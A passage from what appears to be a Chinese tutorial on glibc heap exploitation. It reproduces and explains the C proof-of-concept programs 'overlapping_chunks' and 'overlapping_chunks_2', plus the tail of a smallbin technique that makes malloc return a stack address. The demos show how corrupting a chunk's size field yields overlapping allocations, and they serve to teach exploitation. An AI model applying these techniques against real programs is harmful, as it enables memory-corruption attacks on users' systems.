返回给p3地址就是原来的victim地址，而且此时前面伪造的fake chunk也被连接到了smallbin上。
再次malloc
    p4 = malloc(0x80);
这次返回的p4就将是一个栈地址！
这个技术最重要的地方在于成功将victim chunk和两个fake chunk构造成双向链表。
还是给个示意图：
这就是布局好的双向链表。
可以看到 **stack_buffer_2** 的bk字段是空着的，那是因为我们这时没有进行信息的泄露，如果泄露出 **smallbin_head**
的值并填上去的话，这个链表才算是完整，当然如果没必要的话可以不这样做。尽管之后的针对这个smallbin的malloc会报错。
在前面我补充说过：
    【注】：源码我改动过，使其编译为64位可执行文件仍能正常运行。其实不改的话也能正常运行，不过改了之后看得更直观。
**原来的代码中victim chunk的大小是100，malloc之后会对齐到0x70。**
0x70在32位系统上属于smallbin，在64位系统上属于fastbin。
原本针对32位程序的代码编译为64位程序也能正常运行，这是为什么？
这是因为，不管这个0x70大小的victim
chunk是先加入unsotedbin还是fastbin，在之后都会被加入到smallbin中，smallbin也有0x70大小的链表！
可以看下图，这时victim chunk被加入fastbin链表的时候：
在经过 **void *p2 = malloc(1200);** 后：
而在我改过代码之后，victim chunk就是正常地先加入unsortedbin再加入smallbin了。
**0x06 overlapping_chunks**
****
**源码：**
    /*
     A simple tale of overlapping chunk.
     This technique is taken from
     http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf
    */
    #include 
    #include 
    #include 
    #include 
    int main(int argc , char* argv[]){
      intptr_t *p1,*p2,*p3,*p4;
      printf("nThis is a simple chunks overlapping problemnn");
      printf("Let's start to allocate 3 chunks on the heapn");
      p1 = malloc(0x100 - 8);
      p2 = malloc(0x100 - 8);
      p3 = malloc(0x80 - 8);
      printf("The 3 chunks have been allocated here:np1=%pnp2=%pnp3=%pn", p1, p2, p3);
      memset(p1, '1', 0x100 - 8);
      memset(p2, '2', 0x100 - 8);
      memset(p3, '3', 0x80 - 8);
      printf("nNow let's free the chunk p2n");
      free(p2);
      printf("The chunk p2 is now in the unsorted bin ready to serve possiblennew malloc() of its sizen");
      printf("Now let's simulate an overflow that can overwrite the size of the chunk freed p2.n");
      printf("For a toy program, the value of the last 3 bits is unimportant;"
            " however, it is best to maintain the stability of the heap.n");
      printf("To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),"
            " to assure that p1 is not mistaken for a free chunk.n");
      int evil_chunk_size = 0x181;
      int evil_region_size = 0x180 - 8;
      printf("We are going to set the size of chunk p2 to to %d, which gives usna region size of %dn",
             evil_chunk_size, evil_region_size);
      *(p2-1) = evil_chunk_size; // we are overwriting the "size" field of chunk p2
      printf("nNow let's allocate another chunk with a size equal to the datan"
               "size of the chunk p2 injected sizen");
      printf("This malloc will be served from the previously freed chunk thatn"
               "is parked in the unsorted bin which size has been modified by usn");
      p4 = malloc(evil_region_size);
      printf("np4 has been allocated at %p and ends at %pn", p4, p4+evil_region_size);
      printf("p3 starts at %p and ends at %pn", p3, p3+80);
      printf("p4 should overlap with p3, in this case p4 includes all p3.n");
      printf("nNow everything copied inside chunk p4 can overwrites data onnchunk p3,"
            " and data written to chunk p3 can overwrite datanstored in the p4 chunk.nn");
      printf("Let's run through an example. Right now, we have:n");
      printf("p4 = %sn", (char *)p4);
      printf("p3 = %sn", (char *)p3);
      printf("nIf we memset(p4, '4', %d), we have:n", evil_region_size);
      memset(p4, '4', evil_region_size);
      printf("p4 = %sn", (char *)p4);
      printf("p3 = %sn", (char *)p3);
      printf("nAnd if we then memset(p3, '3', 80), we have:n");
      memset(p3, '3', 80);
      printf("p4 = %sn", (char *)p4);
      printf("p3 = %sn", (char *)p3);
    }
**翻译：**
这是一个简单的堆块重叠的问题。
先malloc三个堆块：
    p1 = malloc(0x100 - 8);
    p2 = malloc(0x100 - 8);
    p3 = malloc(0x80 - 8);
现在free掉p2
p2被free之后加入到了unsortedbin链表中待命
现在让我们模拟一个可以改写p2.size的溢出。
    int evil_chunk_size = 0x181;
    *(p2-1) = evil_chunk_size;
对于我们这个例子来讲三个标志位影响不是很大，但是为了保持堆的稳定性，还是不要随意改动。
至少我们要确保pre_in_use为true，不要让p1被误认为被free了。
我们将p2的size改写为0x181，之后的malloc就会返回给我们一个0x178（可使用大小）的堆块。
…
下面的就不再翻译了，大概意思就是malloc(0x178)返回了p2的地址，而且包含了整个p3在里面。
    int evil_region_size = 0x180 - 8;
    p4 = malloc(evil_region_size);
返回给p4的地址就是原来p2的，而且p4中包含了还没被free的p3。
我们前面通过溢出一个null byte来达到overlapping chunk的效果。
这里就非常简单暴力了，直接修改已经free的chunk的size字段，而且只用修改这个字段，就可以达到攻击的目的了。
之后的malloc就可以返回一个带有overlapping效果的chunk。
没太多可讲的，整个过程也比较简单。
**0x07 overlapping_chunks_2**
****
**源码：**
    /*
     Yet another simple tale of overlapping chunk.
     This technique is taken from
     https://loccs.sjtu.edu.cn/wiki/lib/exe/fetch.php?media=gossip:overview:ptmalloc_camera.pdf.
     This is also referenced as Nonadjacent Free Chunk Consolidation Attack.
    */
    #include 
    #include 
    #include 
    #include 
    #include 
    int main(){
      intptr_t *p1,*p2,*p3,*p4,*p5,*p6;
      unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;
      int prev_in_use = 0x1;
      printf("nThis is a simple chunks overlapping problem");
      printf("nThis is also referenced as Nonadjacent Free Chunk Consolidation Attackn");
      printf("nLet's start to allocate 5 chunks on the heap:");
      p1 = malloc(1000);
      p2 = malloc(1000);
      p3 = malloc(1000);
      p4 = malloc(1000);
      p5 = malloc(1000);
      real_size_p1 = malloc_usable_size(p1);
      real_size_p2 = malloc_usable_size(p2);
      real_size_p3 = malloc_usable_size(p3);
      real_size_p4 = malloc_usable_size(p4);
      real_size_p5 = malloc_usable_size(p5);
      printf("nnchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1));
      printf("nchunk p2 from %p to %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));
      printf("nchunk p3 from %p to %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));
      printf("nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4));
      printf("nchunk p5 from %p to %pn", p5,  (unsigned char *)p5+malloc_usable_size(p5));
      memset(p1,'A',real_size_p1);
      memset(p2,'B',real_size_p2);
      memset(p3,'C',real_size_p3);
      memset(p4,'D',real_size_p4);
      memset(p5,'E',real_size_p5);
      printf("nLet's free the chunk p4.nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4n"); 
      free(p4);
      printf("nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2nwith the size of chunk_p2 + size of chunk_p3n");
      *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //<--- BUG HERE 
      printf("nNow during the free() operation on p2, the allocator is fooled to think that nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) n");
      printf("nThis operation will basically create a big free chunk that wrongly includes p3n");
      free(p2);
      printf("nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunkn");
      p6 = malloc(2000);
      real_size_p6 = malloc_usable_size(p6);
      printf("nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and nwe can overwrite data in p3 by writing on chunk p6n");
      printf("nchunk p6 from %p to %p", p6,  (unsigned char *)p6+real_size_p6);
      printf("nchunk p3 from %p to %pn", p3, (unsigned char *) p3+real_size_p3); 
      printf("nData inside chunk p3: nn");
      printf("%sn",(char *)p3); 
      printf("nLet's write something inside p6n");
      memset(p6,'F',1500);  
      printf("nData inside chunk p3: nn");
      printf("%sn",(char *)p3); 
    }
**翻译：**
这同样是一个简单的堆块重叠的问题。
这也被称为非相邻free chunk合并攻击。
首先malloc五个堆块：
    p1 = malloc(1000);